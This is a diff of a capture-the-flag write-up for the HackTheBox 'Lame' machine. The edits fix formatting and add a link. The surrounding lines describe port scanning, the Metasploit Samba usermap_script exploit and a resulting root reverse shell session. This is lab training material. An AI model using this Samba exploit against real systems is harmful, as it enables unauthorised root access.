@@ -13,11 +13,12 @@ category: HackTheBox
 
 # Lame
 
-HackTheBox Link to Lame Machine
+HackTheBox Link to Lame Machine - [HTB Lame](https://app.hackthebox.com/machines/lame)
+
 
 Initial Nmap Scan for the machine/endpoint
 
-The default scan gives no results , using -Pn switch gives FTP, SSH, NetBIOS, and SMB ports, scanning for all ports adds one more open port - 3632 . So we scan all these ports for Service versions.&#x20;
+The default scan gives no results , using -Pn switch gives FTP, SSH, NetBIOS, and SMB ports, scanning for all ports adds one more open port - 3632 . So we scan all these ports for Service versions.
 
 ```bash
 ┌──(abhinav㉿ETHICALHACKX)-[~]
@@ -89,8 +90,8 @@ Nmap done: 1 IP address (1 host up) scanned in 51.88 seconds
 ```
 
 
-Searching Exploits\
-vsftpd anonymous Login to [FTP](../linux/ftp.md) did not give any results, hence looking at SMBA.
+Searching Exploits 
+vsftpd anonymous Login to FTP did not give any results, hence looking at SMB.
 
 ```bash
 ┌──(abhinav㉿ETHICALHACKX)-[~]
@@ -231,7 +232,7 @@ msf6 exploit(multi/samba/usermap_script) > run
 [*] Command shell session 1 opened (10.10.14.10:4444 -> 10.10.10.3:45549) at 2023-05-28 22:32:45 +0530
 
 
-````
+```
 
 Checking the user on Shell session we notice we are now root, so we can read through all the flags , user flag present in makis user directory and root at usual location
 
